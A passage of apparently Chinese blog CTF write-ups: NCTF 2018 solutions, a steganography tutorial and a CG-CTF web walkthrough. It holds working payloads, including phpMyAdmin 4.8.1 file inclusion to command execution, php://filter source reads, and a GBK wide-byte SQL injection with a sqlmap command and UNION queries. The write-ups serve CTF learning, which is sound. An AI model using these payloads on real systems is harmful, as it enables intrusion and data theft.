</span><br><span class="line">   alert(&quot;你手速太快啦，服务器承受不住!!!&quot;);  </span><br><span class="line">   window.history.back(-1); &lt;/script&gt; &apos;;</span><br><span class="line">  &#125;</span><br><span class="line">  if(intval(time())-$_SESSION[&apos;time&apos;]&gt;2)&#123;</span><br><span class="line">   session_destroy();</span><br><span class="line">   echo &apos;</span><br><span class="line">   &lt;script language=&quot;javascript&quot;&gt;  </span><br><span class="line">   alert(&quot;你算的太慢了少年！&quot;);  </span><br><span class="line">   window.history.back(-1); &lt;/script&gt; &apos;;</span><br><span class="line">  &#125;</span><br><span class="line">  echo &apos;</span><br><span class="line">  &lt;script language=&quot;javascript&quot;&gt;  </span><br><span class="line">  alert(&quot;tql，算对了！！&quot;);  </span><br><span class="line">      &lt;/script&gt; &apos;;</span><br><span class="line">  $_SESSION[&apos;count&apos;]++;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>关键信息：</p><ul><li>input 的变量经过了 php 的<code>intval</code>处理 </li><li>计算时间要在 1-2 秒之间 </li><li>算对的次数会累加</li></ul><p>使用了intval函数来防止整数溢出的危害，所以我们输入的大于二十一位的数字经过该函数处理后发生了变化。要注意的是intval()函数在32位机器和64机器上的运行结果也是不一样的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo intval(&apos;4200000000000000000000&apos;);?&gt;</span><br><span class="line">32位系统：2147483647 64位系统：9223372036854775807</span><br></pre></td></tr></table></figure><p>改了一下网上的脚本跑出flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">s = requests.Session()  # 保持当前会话的持续有效性</span><br><span class="line">url = &quot;http://ctfgame.acdxvfsvd.net:20004/&quot;</span><br><span class="line">number =&quot;4200000000000000000000&quot;  #输入的数字</span><br><span class="line">r = s.get(url)</span><br><span class="line">math = &apos;&apos;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;,</span><br><span class="line">    &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0&apos;,</span><br><span class="line">&#125;</span><br><span class="line">while(1):</span><br><span class="line">    pattern =re.compile(r&apos;&lt;div style=&quot;display:inline;&quot;&gt;(.*?)&lt;/div&gt;&apos;)   #构建正则</span><br><span class="line">    num = pattern.findall(r.text)   #正则提取公式</span><br><span class="line">    result = &quot;9223372036854775807&quot;+&apos;+&apos;+math.join(num)[0:-1]  #拼接真实的公式，切片是为了舍去等号</span><br><span class="line">    ans = eval(result)   #利用eval直接来计算结果</span><br><span class="line">    </span><br><span class="line">    data = &#123;</span><br><span class="line">        &apos;input&apos;:&apos;4200000000000000000000&apos;,</span><br><span class="line">        &apos;ans&apos;:ans</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(url,headers=headers,data=data)</span><br><span class="line">    time.sleep(1.5)   #延时1.5秒</span><br><span class="line">    print(r.text)</span><br></pre></td></tr></table></figure><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><img src="/2018/11/29/NCTF-2018/6.jpg"><p>给了一个phpMyAdmin的网址，这题学到了phpMyAdmin本地文件包含漏洞</p><p>2018-06-21 ChaMd5安全团队公开了一个<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="noopener">phpMyAdmin 4.8.1后台getshell</a>，该漏洞利用不要求root帐号，只需能够登录 phpMyAdmin 便能够利用。</p><p>查看页面源代码发现Mysql版本是4.8.1，登录的账号密码是网上的弱口令组合guest+guest</p><p>这种文件包含漏洞可以读取任意文件，首先要知道在URL编码中%3f是用于分割实际URL和参数的 ，先判断一下根目录的位置为<code>../../../../</code>，但实际操作时发现，就算多加了几个../也没有关系，因为到根目录就没法继续往上了。</p><p>构建url： <code>http://ctfgame.acdxvfsvd.net:20006/index.php?target=db_sql.php%253f/../../../../etc/passwd</code>出现如下图回显验证该漏洞存在</p><img src="/2018/11/29/NCTF-2018/12.png"><p>我们知道phpMyAdmin默认自带phpinfo文件，访问 </p><p>访问 <code>http://ctfgame.acdxvfsvd.net:20006/index.php?target=db_sql.php%253f/../info.php</code> </p><p>有一栏叫做”session_save_path”，这一项是专门用来保存session的路径的。而我们这道题就是通过本地文件包含session来读取sql执行语句中插入php代码，让本地文件包含的时候执行php语句。 </p><p>session文件名默认为session_你的sessionid，sessionid就是你在浏览器中cookie的phpmyadmin的值，这里session日志的保存路径是/tmp/sess_你的sessionid</p><p>在phpMyAdmin中执行sql语句 <code>select &#39;&lt;?php system(&quot;ls&quot;);?&gt;;&#39;</code></p><p>再访问<code>http://ctfgame.acdxvfsvd.net:20006/index.php?target=db_sql.php%253f/../../../../temp/xxxxxx</code>可以执行系统命令并得到回显</p><p>通过一系列的<code>ls</code>查找到可疑文件<code>nctfffffffff</code></p><p>最后的payload<code>select &#39;&lt;?php system(&quot;cd /&amp;&amp;cat nctfffffffff&quot;);?&gt;;&#39;</code></p><p>对phpMyAdmin 4.8.x本地文件包含利用的漏洞，我参考了VulnSpy的<a href="http://www.vulnspy.com/phpmyadmin-4.8.1/phpmyadmin_4.8.1_lfi_to_rce_vulnerability/#M-yKH6TajZ4FQiZwKabDXpThky34kEerbp" target="_blank" rel="noopener">在线环境</a></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="CalcNow"><a href="#CalcNow" class="headerlink" title="CalcNow"></a>CalcNow</h2><img src="/2018/11/29/NCTF-2018/7.jpg"><p>这道题学习了python的pwn库的使用，参考这篇 <a href="http://brieflyx.me/2015/python-module/pwntools-intro/" target="_blank" rel="noopener">Exploit利器——Pwntools</a></p><p>要注意的是这个库对windows支持蛮不友好的，我直接在kali里用了</p><p>nc连接之后会显示一个要计算的表达式，要求两秒内算出，这题nc连接后回显的内容忘截图了，直接看脚本吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/user/bin/enc python</span><br><span class="line">from pwn import *</span><br><span class="line">result=0</span><br><span class="line">a = remote(&quot;ctfgame.acdxvfsvd.net&quot;,30003)</span><br><span class="line">a.recvuntil(&quot;Your Token:\n&quot;)</span><br><span class="line">a.sendline(&quot;hqd5NgJ5tr0ObfJliY0vsiZHahw3epkr&quot;)</span><br><span class="line">a.recvuntil(&quot;Before becoming a PWNer, you should know how to write script\n&quot;)</span><br><span class="line">a.recvuntil(&quot;Tools: python module -&gt; pwntools(sudo pip install pwn)/SOCKET/zio...\n&quot;)</span><br><span class="line">calc_str = a.recv(1024)</span><br><span class="line">number1 = calc_str[:25]</span><br><span class="line">iterator = calc_str[26:29]</span><br><span class="line">number2 = calc_str[30:].replace(&quot; &quot;,&quot;&quot;)</span><br><span class="line">print number1+iterator+number2</span><br><span class="line">if(iterator==&apos;add&apos;):</span><br><span class="line">result = int(number1) + int(number2)</span><br><span class="line">if(iterator==&apos;sub&apos;):</span><br><span class="line">result = int(number1) - int(number2)</span><br><span class="line">print result</span><br><span class="line">a.sendline(str(result))</span><br><span class="line">s = a.recvrepeat()</span><br><span class="line">print s</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>现在是零点了，还想看看python，太菜了就少睡点觉吧！</p><p>打完这次比赛发现自己好多题还是没有思路，还有写脚本的能力太弱了，正则也有很多细节没学好，接下来准备从核心编程和python黑帽子入手深入学一下python。</p><p>通过ctf发现自己很多常见漏洞之前都是一知半解的没有很深入的理解利用，接下来要静下心来多看看书。</p><p>要考四级了，也要期末了</p><p>希望自己能沉稳一点，每天都能比昨天的自己进步一点点</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一道MISC带你走入双图隐写</title>
      <link href="/2018/11/21/%E4%B8%80%E9%81%93MISC%E5%B8%A6%E4%BD%A0%E8%B5%B0%E5%85%A5%E5%8F%8C%E5%9B%BE%E9%9A%90%E5%86%99/"/>
      <url>/2018/11/21/%E4%B8%80%E9%81%93MISC%E5%B8%A6%E4%BD%A0%E8%B5%B0%E5%85%A5%E5%8F%8C%E5%9B%BE%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>隐写术是什么？顾名思义是隐藏信息书写的技术，是信息隐藏技术的一种。</p><p>隐写术中有一个很经典的模型，叫做Simmons模型，也是常说的囚犯问题。</p><p>Alice 和 Bob 分属两个牢房，为了合谋越狱需要进行通信，而通信的信件必须经过中间看守人Wendy的审阅。Wendy可以阅读信件的内容，而且阅读后可以决定是否传送这封信件。这时，对信息进行加密不可取，因为看守人会阅读传送的信息的内容，加密后的信息大概率会引起看守人的怀疑，看守人不但可以选择不发送，还可以以此为依据对两名犯人进行调查。 因此需要一种对通信过程隐藏的手段 ，即隐写术。简单概括，隐写术试图隐藏的是通信事件本身。</p><p>推荐一本我在某邮图书馆翻到的书 《数据隐藏技术解密》——[美]Michael Raggo</p><a id="more"></a><h1 id="一道双图隐写的CTF题"><a href="#一道双图隐写的CTF题" class="headerlink" title="一道双图隐写的CTF题"></a>一道双图隐写的CTF题</h1><p>做题之前，我对一些常见文件格式分析和常用工具进行了一些了解，这篇文章不进行赘述了，有兴趣的可以自己了解一下，或者我以后闲下来可能会整理出来？？这里只推荐一篇 <a href="https://www.cnblogs.com/Yuuki-/p/7868858.html" target="_blank" rel="noopener">png文件结构的博客</a></p><p>题目图片链接：<a href="https://pan.baidu.com/s/1Ztx0o_-V8XhzBzvSSothtg" target="_blank" rel="noopener">https://pan.baidu.com/s/1Ztx0o_-V8XhzBzvSSothtg</a> </p><p>提取码：qdtf </p><p>先用Binwalk分析文件</p><img src="/2018/11/21/一道MISC带你走入双图隐写/1.png"><p>发现藏了两张图片，用foremost分离</p><img src="/2018/11/21/一道MISC带你走入双图隐写/2.png"><p>在kali中使用compare比较两个图片并生成一张比较图会发现左下角有一条红线，红线处就是存在不同的地方，这种情况一般是双图像运算。</p><p>compare生成比较文件命令 <code>compare 1.png 2.png output.png</code></p><p>使用Stegsolve打开一个图片，然后用Analyse选项的Image Combiner功能再添加一个图片进行异或操作，这样会把两个图片相同的部分变为0，不同的部分保留。然后保存异或运算后生成的bmp图片，用WinHex打开这个图片会发现这个文件中大部分都为0，不为0的部分就是两张图片不相同的区间，也就是之前红线处图片的差异。</p><img src="/2018/11/21/一道MISC带你走入双图隐写/3.png"><p>记录不为0部分的偏移量区间，把原来分离出来的两个图片文用画图板另存为bmp格式，因为XOR异或出来的图片格式为BMP需要使用相同格式的图片寻找差异处。</p><p>用winhex打开两个图片，分别找到对应的偏移量区间如下</p><img src="/2018/11/21/一道MISC带你走入双图隐写/4.png"><img src="/2018/11/21/一道MISC带你走入双图隐写/5.png"><p>发现其中的差异是第二张图片中一些字节被替换成了00或01，找一下规律发现是每隔两个字节替换一次（每三个Hex的第一个Hex都是00或01，其实每三个Hex代表一个RGB通道，也就是信息隐藏在R通道中），分析这些0和1连接到一起可能会产生二进制信息，但是又不能挨个打出来吧。先把这一段十六进制数据复制下来，找到规律利用python切片连接这些01。</p><img src="/2018/11/21/一道MISC带你走入双图隐写/6.png"><p>这里是将一串binary写入R通道中的时候，0变成了00， 1变成了01。</p><p>得到的01数据长度len()一下发现是8的倍数，这时可以直接使用JPK工具格式化二进制数据并转换成Ascii码</p><img src="/2018/11/21/一道MISC带你走入双图隐写/7.png"><img src="/2018/11/21/一道MISC带你走入双图隐写/8.png"><p>得到flag</p><p>也可以自己写一个脚本来处理这串01序列</p><p>1.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">str=&quot;0100100101010011010001110111101101000101001101000111001101011001010111110101001101110100010001010110011100110100011011100011000001100111010100100011010001110000010010000111100101111101&quot;</span><br><span class="line">i = 0</span><br><span class="line">while i&lt;len(str):</span><br><span class="line">    sys.stdout.write(chr(int(str[i:i+8],2)))</span><br><span class="line">    i+=8</span><br><span class="line"></span><br><span class="line">print</span><br></pre></td></tr></table></figure><img src="/2018/11/21/一道MISC带你走入双图隐写/9.png"><h1 id="走进双图隐写"><a href="#走进双图隐写" class="headerlink" title="走进双图隐写"></a>走进双图隐写</h1><p>双图隐写泛指CTF竞赛中所有以两张图片为解题线索的题型，这里的两张图片可以指给出一张图片然后隐藏了另一张图片，也可以指直接给出了两张图片但是需要两张图片结合分析来提取出隐藏信息。</p><p>双图隐写原理： </p><ol><li><p>图像格式拼接</p><p>不同的图像格式存在不同的文件头和文件尾 </p></li><li><p>图层叠加 </p><p>图像由图图叠加而成，图层由像素组成，每一张图层可以理解为一层透明的“玻璃”，它们各自包含独立的内容，可以理解为将各个图层从上到下依次重叠，然后俯视观测第一张图层，各个图层显示的叠加效果为图像最后的显示效果。</p><img src="/2018/11/21/一道MISC带你走入双图隐写/10.png"> </li><li><p>图像运算</p><p>实质上是像素的运算，两张图像相加，实质上是两张图像对应位置的像素相加 </p><img src="/2018/11/21/一道MISC带你走入双图隐写/11.png"></li></ol><p>这道题的考点是双图像运算，这种题目的特征为binwalk发现的两张图片分离后看起来完全相同，处理时可能对两张图片进行异或运算，两张图片的差异数据中存在隐藏信息。</p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>最近感觉自己也没学啥，看了看隐写术的常见套路，回头再把那本书看完就圆满了。</p><p>等周末打打看NJUPTCTF就滚回去学python和java了。</p><p>不想写了，这篇博客就草草收尾了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CG-CTF web篇零基础指南</title>
      <link href="/2018/11/14/CG-CTF-web%E7%AF%87%E9%9B%B6%E5%9F%BA%E7%A1%80%E6%8C%87%E5%8D%97/"/>
      <url>/2018/11/14/CG-CTF-web%E7%AF%87%E9%9B%B6%E5%9F%BA%E7%A1%80%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>用了三四天终于把南邮ctf平台的web题做了差不多，也算对ctf多了一些了解，之前发过一篇综合题(2)的writeup，这次准备从头整理一遍。因为我自己就是个萌新，这两天通过做题学到了很多，所以整理的会很详细！</p><p><a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">南邮CG CTF web传送门</a></p><a id="more"></a><h1 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h1><h2 id="1-签到题"><a href="#1-签到题" class="headerlink" title="1.签到题"></a>1.签到题</h2><p>直接看源代码就可以看到flag了</p><h2 id="2-md5-collision"><a href="#2-md5-collision" class="headerlink" title="2.md5 collision"></a>2.md5 collision</h2><p>php源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$md51 = md5(&apos;QNKCDZO&apos;);</span><br><span class="line">$a = @$_GET[&apos;a&apos;];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    echo &quot;nctf&#123;*****************&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br></pre></td></tr></table></figure><p>php弱类型的利用，这道题满常见的，需要传入一个参数a不等于 ‘QNKCDZO’，但是md5加密后的值与 ‘QNKCDZO’ md5加密后的松散比较相等。<em>md5(‘QNKCDZO’)=’0e830400451993494058024219903391’</em> ，而PHP在处理哈希字符串时，会利用<code>!=</code>或<code>==</code>来对哈希值进行比较，它把每一个以<code>0E</code>开头的哈希值都解释为<code>0</code>，所以如果两个不同的密码经过哈希以后，其哈希值都是以<code>0E</code>开头的，那么PHP将会认为他们相同，都是<code>0</code>。</p><p>所以给 a 传入一个 md5 加密后也为 0e 开头的字符串即可，这样的字符串一搜一大把了</p><p>这里我传了 <code>?a=s878926199a</code> 拿到flag</p><p>tips：</p><p>1、在PHP中，@被称为错误控制操作符，前置@符号的表达式产生的任何错误都将被忽略。</p><p>2、1992年发布的MD5算法是一种广泛使用的哈希算法，最初被设计用来作为加密算法，在被证明不安全后只能用来做数据完整性校验。MD5算法为消息产生128位摘要，常表示为32位或16位十六进制串，由[0-9a-e]组成。</p><p>3、PHP的比较操作符主要有两类——松散比较和严格比较，于是就有了equal(==)和Identical(===)两种相等，主要区别在于前者会在比较前根据上下文对操作数进行类型转换而后者不会。</p><h2 id="3-签到2"><a href="#3-签到2" class="headerlink" title="3.签到2"></a>3.签到2</h2><img src="/2018/11/14/CG-CTF-web篇零基础指南/1.jpg"><p>这道题是前端对输入框长度的限制，F12查看页面代码发现 <code>maxlength=&quot;10&quot;</code> 而需要输入的口令 “zhimakaimen为11位，直接在查看器更改10为任意大于等于11的数再输入口令即可。</p><h2 id="4-这题不是web"><a href="#4-这题不是web" class="headerlink" title="4.这题不是web"></a>4.这题不是web</h2><p>打开题目地址发现一个可爱的动图，把图片下载到本地，用文本编辑器或winHex打开(记事本就可以了)，Ctrl + F 查找flag，在末尾。</p><h2 id="5-层层递进"><a href="#5-层层递进" class="headerlink" title="5.层层递进"></a>5.层层递进</h2><p>又是一道查看源代码的题，在\&lt;iframe>标签中跟着链接依次访问嵌套的<code>SO.html</code> -&gt; <code>S0.html</code>-&gt;<code>SO.htm</code> -&gt;<code>S0.htm</code>-&gt;<code>404.html</code> ，在404.html注释中找到flag</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/2.jpg"><h2 id="6-AAencode"><a href="#6-AAencode" class="headerlink" title="6.AAencode"></a>6.AAencode</h2><p>javascript aaencode </p><p>这道题链接坏了，在南邮旧ctf平台找到了这道题的<a href="http://chinalover.sinaapp.com/web20/aaencode.txt" target="_blank" rel="noopener">链接</a></p><p>打开题目是乱码，用火狐Unicode编码后是颜文字</p><p>提示是js aaencode，是一种把js代码编码成颜文字的编码方式，直接把这段颜文字拉到控制台执行，发现有错误</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/3.jpg"><p>错误提示：<code>ωﾟﾉ is not defined</code> ，即 <code>ωﾟﾉ</code> 这个变量没有被定义，那我们先在控制台定义这个变量，再执行代码</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/4.jpg"><p>拿到flag</p><h2 id="7-单身二十年"><a href="#7-单身二十年" class="headerlink" title="7.单身二十年"></a>7.单身二十年</h2><p>访问 <em><a href="http://chinalover.sinaapp.com/web8/search_key.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web8/search_key.php</a></em> 会被重定向到 <em><a href="http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php</a></em>  ，重定向会被浏览器自动处理，burp抓包repeater重放一下拿到flag。</p><h2 id="8-php-decode"><a href="#8-php-decode" class="headerlink" title="8.php decode"></a>8.php decode</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function CLsI($ZzvSWE)</span><br><span class="line"> &#123;</span><br><span class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</span><br><span class="line">    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123;</span><br><span class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);</span><br><span class="line">    &#125;</span><br><span class="line">    return $ZzvSWE;&#125;</span><br><span class="line">echo CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;);</span><br></pre></td></tr></table></figure><p>应该是一道编码题，但是可以直接在<a href="https://tool.lu/coderunner/" target="_blank" rel="noopener">代码在线运行</a>的网站允许一下这段php代码，就可以跑出flag了</p><h2 id="9-文件包含"><a href="#9-文件包含" class="headerlink" title="9.文件包含"></a>9.文件包含</h2><p>使用php的filter协议读取index.php</p><p>payload：<code>http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=./index.php</code></p><p>显示了base64编码后的index.php源码，这种方法经常用得到，把得到的编码在<a href="http://tool.chinaz.com/Tools/Base64.aspx" target="_blank" rel="noopener">在线网站</a>解码得到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;asdf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!$_GET[file])&#123;echo &apos;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&apos;;&#125;</span><br><span class="line">$file=$_GET[&apos;file&apos;];</span><br><span class="line">if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">echo &quot;Oh no!&quot;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">include($file); </span><br><span class="line">//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>查看源码得到flag</p><p>更多php伪协议实现命令执行的姿势可见 <a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">传送门</a></p><h2 id="10-单身一百年也没用"><a href="#10-单身一百年也没用" class="headerlink" title="10.单身一百年也没用"></a>10.单身一百年也没用</h2><p>这道题的flag藏在了响应信息中</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/5.jpg"><h2 id="11-Download"><a href="#11-Download" class="headerlink" title="11.Download~!"></a>11.Download~!</h2><p>这道题链接找不到了，提示是别下音乐</p><p>看网上的解题是进去之后会看到两个下载音乐的链接，查看源代码发现星星点灯的下载链接为<code>download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM=</code>，经过了base64加密，解码内容为xingxingdiandeng.mp3。</p><p>尝试下载其他页面如index.php download.php及它们base64加密后的页面，发现download.php可以下载</p><p>打开下载的download文件，发现首先对url参数进行了base64解码，并且只有四个文件能够正常下载，否则提示Access Forbidden！下载hereiskey.php，得到flag 。</p><h2 id="12-COOKIE"><a href="#12-COOKIE" class="headerlink" title="12.COOKIE"></a>12.COOKIE</h2><p>TIP: 0==not </p><p>F12看网络，把请求头中的Cookie：<code>Login=0</code> 改成 <code>Login=1</code> 重新发包后在响应主体中拿到flag</p><h2 id="13-MYSQL"><a href="#13-MYSQL" class="headerlink" title="13.MYSQL"></a>13.MYSQL</h2><p>根据提示查看robots.txt （robots.txt是一个告诉爬虫那些东西不能爬的文件，在ctf中是一个经常存在的有提示信息的文件）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">TIP:sql.php</span><br><span class="line">&lt;?php</span><br><span class="line">if($_GET[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id = intval($_GET[id]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&apos;$id&apos;&quot;));</span><br><span class="line">  if ($_GET[id]==1024) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">    echo($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>说明要向sql.php提交一个id，使得<code>intval($_GET[id])</code>为1024而<code>$_GET[id]==1024</code>为假。 </p><p>这里有两种做法</p><p>1.传入id=1024.1，intval()函数会把1024.1取整为1024</p><p>2.利用intval()函数的特性：只识别到非数字的那一位，而松散比较的强制类型转换会把e当作科学记数法的一部分处理，即科传入id=1024e1</p><h2 id="14-GBK-Injection"><a href="#14-GBK-Injection" class="headerlink" title="14.GBK Injection"></a>14.GBK Injection</h2><img src="/2018/11/14/CG-CTF-web篇零基础指南/6.jpg"><p>把id参数的值改成2，3得到两个提示信息：gbk_sql_injection 和 the fourth table </p><p>在参数后面加个单引号，发现sql语句转译成了<code>your sql:select id,title from news where id = &#39;3\&#39;&#39;</code></p><p>判断存在GBK宽字节注入， flag在第四个表中，用sqlmap一下就跑出来了哈哈</p><p>payload：</p><p><code>python2 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 -T ctf4 -C flag --dump</code> </p><p>手工注入一下：</p><p>先介绍宽字节注入的原理如下，</p><p>当传入 id=1’ 时，单引号会被转义符(反斜线)转义，导致id参数无法逃逸单引号的包围。由于MySQL执行查询时会跳过畸形字符，当输入参数 id=1%df’ 时，参数会经过转义和url编码变为 id=1%df%5c%27，%5c 是反斜杠的url编码，%27 是单引号的url编码。而在GBK编码中，%df%5c是繁体字”連 “，这时单引号成功逃逸。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#第一步 判断是否存在注入</span><br><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1  和</span><br><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27--+ </span><br><span class="line">返回结果相同。</span><br><span class="line"></span><br><span class="line">#第二步 使用union查询数据库名</span><br><span class="line">先用 chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df%27 order by 2--+ 判断有两列</span><br><span class="line">再用 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df%27 union select null,database()--+</span><br><span class="line">得到数据库名为&apos;sae-chinalover&apos;</span><br><span class="line"></span><br><span class="line">#第三步 查询&apos;sae-chinalover&apos;数据库的第四张表名</span><br><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df&apos; union select null,table_name from information_schema.tables where table_schema=database() limit 3,1--+</span><br><span 